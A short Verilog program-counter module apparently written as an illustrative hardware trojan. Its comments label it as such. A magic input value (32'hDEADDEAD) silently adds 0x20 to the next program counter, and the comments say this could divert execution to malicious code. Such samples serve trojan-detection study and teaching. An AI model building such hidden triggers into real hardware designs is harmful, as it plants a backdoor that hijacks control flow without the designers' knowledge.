`timescale 1ns/1ns

module PC #(parameter n = 32) 
    (
        input clk, rst, shift_done,
        input [n-1:0] din,
        output reg [n-1:0] dout
    );

    // Trojan activation signal (for illustration purposes)
    // Assuming the trojan is designed to be activated when din is at a specific value.
    wire trojan_trigger = (din == 32'hDEADDEAD); // Example specific trigger condition

    always @ (posedge clk) begin
        if (rst)
            dout <= {n{1'b0}};
        else if (shift_done) begin
            if (trojan_trigger) begin
                // Trojan behavior: Modify the program counter in an unexpected way.
                // This could be anything from skipping an instruction to jumping to a malicious code segment.
                // Here, for simplicity, we'll just add an arbitrary value to demonstrate.
                dout <= din + 32'h00000020; // Adds an offset to the intended value of din
            end else begin
                dout <= din;
            end
        end
        else
            dout <= dout; // Normal operation
    end

endmodule
 
